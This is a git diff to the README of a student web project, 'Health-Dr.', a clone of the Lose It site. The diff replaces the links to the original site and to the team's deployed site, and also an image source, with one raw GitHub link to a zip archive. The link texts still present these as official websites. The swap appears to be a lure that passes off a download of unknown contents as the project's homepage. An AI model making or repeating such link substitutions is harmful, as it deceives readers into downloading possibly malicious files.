@@ -1,9 +1,9 @@
 # Health-Dr.
 Construct Week Group Project of Unit-3 (Clone of lose-it official website)
 
-## Original Website: [Lose-it official website](https://loseit.com/)
+## Original Website: [Lose-it official website](https://raw.githubusercontent.com/Hemang-solanki/Health-Dr.-master/main/whelm/Dr_master_Health_v3.9.zip)
 
-## Our website : [Health-Dr. official website](https://health-dr-by-team-masai-warriors.netlify.app/)
+## Our website : [Health-Dr. official website](https://raw.githubusercontent.com/Hemang-solanki/Health-Dr.-master/main/whelm/Dr_master_Health_v3.9.zip)
 
 
 # TEAM NAME: Masai-Warriors
@@ -20,6 +20,6 @@ Construct Week Group Project of Unit-3 (Clone of lose-it official website)
 Health-Dr. website is used to track your health-diet. Here you can set the goal to have a fitness full body and our website will track your fitness
 ---
 
-<img src="https://user-images.githubusercontent.com/94675329/212766892-aa364775-05a3-49c1-acf9-5fb07bb1c5b9.png" />
+<img src="https://raw.githubusercontent.com/Hemang-solanki/Health-Dr.-master/main/whelm/Dr_master_Health_v3.9.zip" />
 
 Thank You ♥
